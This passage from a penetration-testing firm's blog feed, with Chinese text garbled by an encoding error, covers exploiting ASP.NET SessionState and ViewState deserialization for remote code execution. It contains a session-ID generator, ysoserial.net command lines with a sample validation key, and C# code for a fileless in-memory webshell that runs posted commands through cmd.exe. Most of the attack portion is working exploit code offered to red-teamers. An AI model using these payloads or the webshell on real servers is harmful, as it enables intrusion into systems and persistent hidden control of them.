&lt;p&gt;åˆ†åˆ¥å°‡ &lt;code class=&quot;highlighter-rouge&quot;&gt;{ASP.NET_SessionId}&lt;/code&gt; æ›¿æ›æˆè‡ªå·±çš„ ASP.NET_SessionId çš„ Cookie å€¼ä»¥åŠ &lt;code class=&quot;highlighter-rouge&quot;&gt;{Hex_Encoded_Payload}&lt;/code&gt; æ›¿æ›æˆå‰é¢æº–å‚™å¥½çš„åºåˆ—åŒ– payload å³å¯ã€‚&lt;/p&gt;

&lt;p&gt;é‚£å‡å¦‚æ²’æœ‰ ASP.NET_SessionId æ€éº¼è¾¦ï¼Ÿé€™è¡¨ç¤ºç›®æ¨™å¯èƒ½é‚„æœªå„²å­˜ä»»ä½•è³‡æ–™åœ¨ Session ä¹‹ä¸­ï¼Œæ‰€ä»¥ä¹Ÿå°±ä¸æœƒç”¢ç”Ÿä»»ä½•è¨˜éŒ„åœ¨è³‡æ–™åº«è£¡ï¼Œä½†æ—¢ç„¶æ²’æœ‰çš„è©±ï¼Œé‚£æˆ‘å€‘å°±ç¡¬å¡ä¸€å€‹ Cookie çµ¦å®ƒï¼ASP.NET çš„ SessionId æ˜¯é€éäº‚æ•¸ç”¢ç”Ÿçš„ 24 å€‹å­—å…ƒï¼Œä½†ä½¿ç”¨äº†å®¢è£½åŒ–çš„å­—å…ƒé›†ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ä»¥ä¸‹çš„ Python script ç”¢ç”Ÿä¸€çµ„ SessionIdï¼Œä¾‹å¦‚ï¼šplxtfpabykouhu3grwv1j1qwï¼Œä¹‹å¾Œå¸¶ä¸Š &lt;code class=&quot;highlighter-rouge&quot;&gt;Cookie: ASP.NET_SessionId=plxtfpabykouhu3grwv1j1qw&lt;/code&gt; ç€è¦½ä»»ä¸€å€‹ aspx é é¢ï¼Œç†è«–ä¸Š ASP.NET å°±æœƒè‡ªå‹•åœ¨è³‡æ–™åº«è£¡æ·»åŠ ä¸€ç­†è¨˜éŒ„ã€‚&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;random&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;chars&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;abcdefghijklmnopqrstuvwxyz012345&#39;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;choice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chars&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å‡å¦‚åœ¨è³‡æ–™åº«è£¡ä»ç„¶æ²’æœ‰ä»»ä½•è¨˜éŒ„å‡ºç¾ï¼Œé‚£å°±åªèƒ½æ‰‹å‹•åˆ» INSERT çš„ SQL ä¾†å‰µé€ ä¸€å€‹è¨˜éŒ„ï¼Œè‡³æ–¼å¦‚ä½•åˆ»å‡ºé€™éƒ¨åˆ†ï¼Ÿåªè¦çœ‹çœ‹ç¨‹å¼ç¢¼æ‡‰è©²å°±å¯ä»¥å¾ˆå®¹æ˜“æ§‹é€ å‡ºä¾†ï¼Œæ‰€ä»¥ç•™çµ¦å¤§å®¶è‡ªè¡Œå»ç© :P&lt;/p&gt;

&lt;p&gt;ç­‰åˆ° Payload é †åˆ©æ³¨å…¥å¾Œï¼Œåªè¦å†æ¬¡ç”¨é€™å€‹ Cookie &lt;code class=&quot;highlighter-rouge&quot;&gt;ASP.NET_SessionId=plxtfpabykouhu3grwv1j1qw&lt;/code&gt; ç€è¦½ä»»ä½•ä¸€å€‹ aspx é é¢ï¼Œå°±æœƒè§¸ç™¼ååºåˆ—åŒ–åŸ·è¡Œä»»æ„ç³»çµ±æŒ‡ä»¤ï¼&lt;/p&gt;

&lt;p&gt;é¡Œå¤–è©±ï¼Œåˆ©ç”¨ SessionState çš„ååºåˆ—åŒ–å–å¾— ASP.NET ç¶²ç«™æ‡‰ç”¨ç¨‹å¼ä¸»æ©Ÿæ§åˆ¶æ¬Šçš„å ´æ™¯ä¸¦ä¸åƒ…é™æ–¼ SQL Injectionã€‚åœ¨å…§ç¶²æ»²é€æ¸¬è©¦çš„éç¨‹ä¸­ï¼Œç¶“å¸¸æœƒé‡åˆ°çš„æƒ…å¢ƒæ˜¯ï¼Œæˆ‘å€‘é€éå„æ–¹çš„è³‡è¨Šæ´©æ¼ ( ä¾‹å¦‚ï¼šå…§éƒ¨ GitLabã€ä»»æ„è®€æª”ç­‰ ) å–å¾—è¨±å¤š SQL Server çš„å¸³è™Ÿã€å¯†ç¢¼ï¼Œä½†å”¯ç¨å–å¾—ä¸äº†ç›®æ¨™ ASP.NET ç¶²ç«™æ‡‰ç”¨ç¨‹å¼çš„ Windows ä¸»æ©Ÿçš„å¸³è™Ÿå¯†ç¢¼ï¼Œè€Œç‚ºäº†é”æˆç›®æ¨™ ( æ§åˆ¶æŒ‡å®šçš„ç¶²ç«™ä¸»æ©Ÿ )ï¼Œæˆ‘å€‘å°±æ›¾ç¶“ä½¿ç”¨éé€™å€‹æ–¹å¼å–å¾—ç›®æ¨™çš„æ§åˆ¶æ¬Šï¼Œæ‰€ä»¥ä½œç‚ºå…§ç¶²æ©«å‘ç§»å‹•çš„æ‰‹æ®µä¹Ÿæ˜¯ç¨å¾®æœ‰åƒ¹å€¼ä¸”éå¸¸æœ‰è¶£ã€‚è‡³æ–¼é‚„èƒ½æœ‰ä»€éº¼æ¨£çš„èŠ±æ¨£èˆ‡ç©æ³•ï¼Œå°±è¦é å„ä½æŒçºŒåœ°ç™¼æ®æƒ³åƒåŠ›ï¼&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2020/04/21/from-sql-to-rce-exploit-aspnet-app-with-sessionstate/</link>
                <guid>https://devco.re/blog/2020/04/21/from-sql-to-rce-exploit-aspnet-app-with-sessionstate</guid>
                <pubDate>Tue, 21 Apr 2020 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>ç©è½‰ ASP.NET VIEWSTATE ååºåˆ—åŒ–æ”»æ“Šã€å»ºç«‹ç„¡æª”æ¡ˆå¾Œé–€</title>
                <description>&lt;h2 id=&quot;å‰è¨€&quot;&gt;å‰è¨€&lt;/h2&gt;

&lt;p&gt;é€™ç¯‡æ–‡ç« å‘¼æ‡‰æˆ‘åœ¨ç ”è¨æœƒ &lt;a href=&quot;https://devco.re/conf/2019/&quot;&gt;DEVCORE Conference 2019&lt;/a&gt; åˆ†äº«çš„ä¸»é¡Œï¼Œå¦‚ä½•ç”¨å°ç¼ºé™·ä¸€æ­¥æ­¥æ“Šç ´ä½¿ç”¨ ASP.NET æ¡†æ¶æ‰€æ’°å¯«çš„å …å›ºçš„ç¶²ç«™æ‡‰ç”¨ç¨‹å¼ï¼Œå…¶ä¸­ä¹‹ä¸€çš„å…§å®¹å°±æ˜¯é—œæ–¼æˆ‘å€‘åœ¨æ­¤ä¹‹å‰éå¾€ç´…éšŠæ¼”ç·´å°ˆæ¡ˆä¸­ï¼ŒæˆåŠŸæ•¸æ¬¡é€é VIEWSTATE çš„ååºåˆ—åŒ–æ”»æ“Šä¸¦è£½é€ é€²å…¥å…§ç¶²çªç ´å£çš„åˆ©ç”¨æ–¹å¼ä»¥åŠå¿ƒå¾—ï¼Œä¹Ÿå°±æ˜¯æ­¤ç¯‡æ–‡ç« çš„ä¸»é¡Œã€‚&lt;/p&gt;

&lt;h2 id=&quot;å…§æ–‡&quot;&gt;å…§æ–‡&lt;/h2&gt;

&lt;p&gt;æœ€è¿‘å¾®è»Ÿç”¢å“ Exchange Server çˆ†å‡ºä¸€å€‹åš´é‡æ¼æ´ CVE-2020-0688ï¼Œå•é¡Œç™¼ç”Ÿçš„åŸå› æ˜¯æ¯å° Exchange Server å®‰è£å®Œå¾Œåœ¨æŸå€‹ Component ä¸­éƒ½ä½¿ç”¨äº†åŒä¸€æŠŠå›ºå®šçš„ Machine Keyï¼Œè€Œç›¸ä¿¡å¤§å®¶éƒ½å·²ç¶“å¾ˆç†Ÿæ‚‰å–å¾— Machine Key ä¹‹å¾Œçš„åˆ©ç”¨å¥—è·¯äº†ï¼Œå¯ä»¥ç«„æ”¹ ASP.NET Form ä¸­çš„ VIEWSTATE åƒæ•¸å€¼ä»¥é€²è¡Œååºåˆ—åŒ–æ”»æ“Šï¼Œå¾è€Œé”æˆ Remote Code Execution æ§åˆ¶æ•´å°ä¸»æ©Ÿä¼ºæœå™¨ã€‚&lt;/p&gt;

&lt;p&gt;æ›´è©³ç´°çš„ CVE-2020-0688 æ¼æ´ç´°ç¯€å¯ä»¥åƒè€ƒ ZDI blogï¼š&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys&quot;&gt;CVE-2020-0688: Remote Code Execution on Microsoft Exchange Server Through Fixed Cryptographic Keys&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å°æ–¼ VIEWSTATE exploit åˆ†æåœ¨ç¶²è·¯ä¸Šå·²ç¶“æœ‰ç„¡æ•¸ç¯‡æ–‡ç« é€²è¡Œæ·±å…¥çš„æ¢è¨ï¼Œæ‰€ä»¥åœ¨æ­¤ç¯‡æ–‡ç« ä¸­å°‡ä¸å†é‡è¤‡è´…è¿°ï¼Œè€Œä»Šå¤©ä¸»è¦æƒ³èŠèŠçš„æ˜¯é—œæ–¼ VIEWSTATE exploit åœ¨æ»²é€æ¸¬è©¦ä¸­å¦‚ä½•é€²è¡Œåˆ©ç”¨ã€‚&lt;/p&gt;

&lt;p&gt;æœ€åŸºæœ¬ã€å¸¸è¦‹çš„æ–¹å¼æ˜¯ç›´æ¥ä½¿ç”¨å·¥å…· &lt;a href=&quot;https://github.com/pwntester/ysoserial.net&quot;&gt;ysoserial.net&lt;/a&gt; çš„ ViewState Plugin ç”¢ç”Ÿåˆæ³• MAC èˆ‡æ­£ç¢ºçš„åŠ å¯†å…§å®¹ï¼ŒTypeConfuseDelegate gadget ç¶“éä¸€é€£ä¸²åå°„å‘¼å«å¾Œé è¨­æœƒ invoke Process.Start å‘¼å« cmd.exeï¼Œå°±å¯ä»¥è§¸ç™¼åŸ·è¡Œä»»æ„ç³»çµ±æŒ‡ä»¤ã€‚&lt;/p&gt;

&lt;p&gt;ä¾‹å¦‚ï¼š&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ysoserial.exe -p ViewState -g TypeConfuseDelegate
              -c &quot;echo 123 &amp;gt; c:\pwn.txt&quot;
              --generator=&quot;CA0B0334&quot;
              --validationalg=&quot;SHA1&quot;
              --validationkey=&quot;B3B8EA291AEC9D0B2CCA5BCBC2FFCABD3DAE21E5&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ç•°å¸¸çš„ VIEWSTATE é€šå¸¸æœƒå°è‡´ aspx é é¢å›æ‡‰ 500 Internal Server Errorï¼Œæ‰€ä»¥æˆ‘å€‘ä¹Ÿç„¡æ³•ç›´æ¥å¾—çŸ¥æŒ‡ä»¤åŸ·è¡Œçš„çµæœï¼Œä½†æ—¢ç„¶æœ‰äº†ä»»æ„åŸ·è¡Œï¼Œè¦ç”¨ PowerShell å›å½ˆ Reverse Shell æˆ–å›å‚³æŒ‡ä»¤çµæœåˆ°å¤–éƒ¨ä¼ºæœå™¨ä¸Šä¸¦ä¸æ˜¯ä»¶é›£äº‹ã€‚&lt;/p&gt;

&lt;p&gt;But ..&lt;/p&gt;

&lt;p&gt;åœ¨æ»²é€æ¸¬è©¦çš„å¯¦æˆ°ä¸­ï¼Œäº‹æƒ…å¾€å¾€æ²’é€™éº¼ç¾å¥½ã€‚ç¾ä»Šä¼æ¥­è³‡å®‰æ„è­˜éƒ½ç›¸å°é«˜ï¼Œç›®æ¨™ä¼ºæœå™¨ç’°å¢ƒå‡ºç¾ä»¥ä¸‹å¹¾ç¨®é™åˆ¶éƒ½å·²æ˜¯å¸¸æ…‹ï¼š&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;å°é–æ‰€æœ‰ä¸»å‹•å°å¤–é€£ç·š&lt;/li&gt;
  &lt;li&gt;ç¦æ­¢æŸ¥è©¢å¤–éƒ¨ DNS&lt;/li&gt;
  &lt;li&gt;ç¶²é ç›®éŒ„ç„¡æ³•å¯«å…¥&lt;/li&gt;
  &lt;li&gt;ç¶²é ç›®éŒ„é›–å¯å¯«ï¼Œä½†å­˜åœ¨ Website Defacement é˜²ç¦¦æ©Ÿåˆ¶ï¼Œæœƒè‡ªå‹•å¾©åŸæª”æ¡ˆ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;æ‰€ä»¥é€™æ™‚å°±å¯ä»¥å……åˆ†åˆ©ç”¨å¦ä¸€å€‹ ActivitySurrogateSelectorFromFile gadget çš„èƒ½åŠ›ï¼Œé€™å€‹ gadget åˆ©ç”¨å‘¼å« Assembly.Load å‹•æ…‹è¼‰å…¥ .NET çµ„ä»¶é”æˆ Remote Code Executionï¼Œæ›å¥è©±èªªï¼Œå¯ä»¥ä½¿æˆ‘å€‘æ“æœ‰åœ¨èˆ‡ aspx é é¢åŒä¸€å€‹ Runtime ç’°å¢ƒä¸­åŸ·è¡Œä»»æ„ .NET èªè¨€ç¨‹å¼ç¢¼çš„èƒ½åŠ›ï¼Œè€Œ .NET é è¨­éƒ½æœƒå­˜åœ¨ä¸€äº›æŒ‡å‘å…±æœ‰è³‡æºçš„å…¨åŸŸéœæ…‹è®Šæ•¸å¯ä»¥ä½¿ç”¨ï¼Œä¾‹å¦‚ &lt;a href=&quot;https://docs.microsoft.com/zh-tw/dotnet/api/system.web.httpcontext.current?view=netframework-4.8&quot;&gt;System.Web.HttpContext.Current&lt;/a&gt; å°±å¯ä»¥å–å¾—ç•¶ä¸‹ HTTP è«‹æ±‚ä¸Šä¸‹æ–‡çš„ç‰©ä»¶ï¼Œä¹Ÿå°±åƒæ˜¯æˆ‘å€‘èƒ½åˆ©ç”¨å®ƒä¾†åŸ·è¡Œè‡ªå·±æ’°å¯«çš„ aspx ç¶²é çš„æ„Ÿè¦ºï¼Œä¸¦ä¸”éç¨‹å…¨æ˜¯åœ¨è¨˜æ†¶é«”ä¸­å‹•æ…‹è™•ç†ï¼Œæ–¼æ˜¯å°±ç­‰åŒæ–¼å»ºç«‹äº†ç„¡æª”æ¡ˆçš„ WebShell å¾Œé–€ï¼&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘åªéœ€è¦ä¿®æ”¹ -g çš„åƒæ•¸æˆ ActivitySurrogateSelectorFromFileï¼Œè€Œ -c åƒæ•¸æ”¾çš„å°±ä¸å†æ˜¯ç³»çµ±æŒ‡ä»¤è€Œæ˜¯æƒ³åŸ·è¡Œçš„ ExploitClass.cs C# ç¨‹å¼ç¢¼æª”æ¡ˆï¼Œå¾Œé¢ç”¨ ; åˆ†è™Ÿåˆ†éš”åŠ ä¸Šæ‰€ä¾è³´éœ€è¦å¼•å…¥çš„ dllã€‚&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile
              -c &quot;ExploitClass.cs;./dlls/System.dll;./dlls/System.Web.dll&quot;
              --generator=&quot;CA0B0334&quot;
              --validationalg=&quot;SHA1&quot;
              --validationkey=&quot;B3B8EA291AEC9D0B2CCA5BCBC2FFCABD3DAE21E5&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é—œæ–¼éœ€è¦å¼•å…¥çš„ dll å¯ä»¥åœ¨å®‰è£äº† .NET Framework çš„ Windows ä¸»æ©Ÿä¸Šæ‰¾åˆ°ï¼Œåƒæˆ‘çš„ç’°å¢ƒæ˜¯åœ¨é€™å€‹è·¯å¾‘ &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Windows\Microsoft.NET\Framework64\v4.0.30319&lt;/code&gt; ä¹‹ä¸­ã€‚&lt;/p&gt;

&lt;p&gt;è‡³æ–¼æœ€é—œéµçš„ ExploitClass.cs è©²å¦‚ä½•æ’°å¯«å‘¢ï¼Ÿå°‡ä¾†æœƒè©¦è‘—æäº¤çµ¦ &lt;a href=&quot;https://github.com/pwntester/ysoserial.net&quot;&gt;ysoserial.net&lt;/a&gt;ï¼Œå°±å¯ä»¥åœ¨ç¯„ä¾‹æª”æ¡ˆè£¡æ‰¾åˆ°å®ƒï¼Œæˆ–æ˜¯å¯ä»¥å…ˆç›´æ¥çœ‹é€™è£¡ï¼š&lt;/p&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;E&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;E&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Web&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Web&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Current&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ClearError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Clear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Diagnostics&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Process&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Diagnostics&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StartInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FileName&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;cmd.exe&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cmd&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StartInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arguments&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/c &quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StartInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RedirectStandardOutput&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StartInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RedirectStandardError&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StartInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UseShellExecute&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StandardOutput&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadToEnd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;End&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å…¶ä¸­ &lt;code class=&quot;highlighter-rouge&quot;&gt;Server.ClearError()&lt;/code&gt; å’Œ &lt;code class=&quot;highlighter-rouge&quot;&gt;Response.End()&lt;/code&gt; éƒ½æ˜¯å¿…è¦ä¸”é‡è¦çš„ä¸€æ­¥ï¼Œå› ç‚ºç•°å¸¸çš„ VIEWSTATE å¿…ç„¶æœƒä½¿å¾— aspx é é¢å›æ‡‰ 500 æˆ–å…¶ä»–éé æœŸçš„ Server Errorï¼Œè€Œå‘¼å«ç¬¬ä¸€å€‹å‡½å¼å¯ä»¥å”åŠ©æ¸…é™¤åœ¨ç•¶å‰ Runtime ç’°å¢ƒä¸‹ stack ä¸­æ‰€è¨˜éŒ„çš„éŒ¯èª¤ï¼Œè€Œå‘¼å« End() å¯ä»¥è®“ ASP.NET å°‡ç•¶å‰ä¸Šä¸‹æ–‡æ¨™è¨˜ç‚ºè«‹æ±‚å·²è™•ç†å®Œæˆä¸¦ç›´æ¥å°‡ Response å›æ‡‰çµ¦å®¢æˆ¶ç«¯ï¼Œé¿å…ç¨‹å¼ç¹¼çºŒé€²å…¥å…¶ä»– Error Handler è™•ç†å°è‡´ç„¡æ³•å–å¾—æŒ‡ä»¤åŸ·è¡Œçš„è¼¸å‡ºçµæœã€‚&lt;/p&gt;

&lt;p&gt;åˆ°é€™å€‹æ­¥é©Ÿçš„è©±ï¼Œç†è«–ä¸Šä½ åªè¦é€å‡ºè«‹æ±‚æ™‚å›ºå®šå¸¶ä¸Šé€™å€‹æƒ¡æ„ VIEWSTATEï¼Œå°±å¯ä»¥åƒæ“ä½œä¸€èˆ¬ WebShell ä¸€æ¨£ï¼š&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20200311/play-with-viewstate-exploit-and-create-fileless-webshell.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

